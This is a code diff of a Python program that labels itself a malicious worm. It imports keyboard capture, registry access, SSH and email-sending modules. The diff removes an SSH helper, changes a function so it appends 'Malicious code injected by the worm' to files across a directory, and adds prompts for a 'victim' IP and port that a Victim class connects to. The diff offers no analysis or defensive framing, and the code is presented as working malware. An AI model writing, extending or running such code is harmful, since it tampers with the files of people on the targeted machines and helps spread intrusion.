@@ -6,11 +6,12 @@ import psutil
 import subprocess
 import keyboard
 import winreg
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 import paramiko
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 
 
 class EmailSender:
@@ -199,51 +200,14 @@ def rewrite_files_in_directory(directory):
 
 def rewrite_file(file_path):
     print(f"Rewriting file: {file_path}")
-    with open(file_path, "w") as file:
-        file.write("This file has been modified by a malicious program.")
-
-
-def ssh_to_server(host, port, username, password):
-    ssh_client = paramiko.SSHClient()
-    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh_client.connect(host, port, username, password)
-        print("Connected to the server via SSH.")
-
-        command = "ls"
-        stdin, stdout, stderr = ssh_client.exec_command(command)
-        output = stdout.read().decode()
-        print(f"Command output:\n{output}")
-
-        ssh_client.close()
-    except paramiko.AuthenticationException:
-        print("Authentication failed. Please check your credentials.")
-    except paramiko.SSHException as e:
-        print("SSH connection failed:", str(e))
-    except paramiko.ssh_exception.NoValidConnectionsError:
-        print("Unable to connect to the server.")
-    except socket.gaierror:
-        print("Invalid server hostname.")
-    except socket.timeout:
-        print("Connection timed out.")
-
-
-def main():
-    # Victim settings
-    victim_ip = "192.168.0.100"
-    victim_port = 1234
-
-    # Connect to the server
-    victim = Victim(victim_ip, victim_port)
-    victim.connect_to_server()
-
-    # Perform online interaction with the server
-    victim.online_interaction()
-
-    # Perform additional actions (optional)
-    # rewrite_files_in_directory("/path/to/directory")
-    # ssh_to_server("example.com", 22, "username", "password")
+    with open(file_path, "a") as file:
+        file.write("\n// Malicious code injected by the worm")
 
 
 if __name__ == "__main__":
-    main()
+    victim_ip = input("Enter the victim's IP address: ")
+    victim_port = int(input("Enter the victim's port number: "))
+
+    victim = Victim(victim_ip, victim_port)
+    victim.connect_to_server()
+    victim.online_interaction()
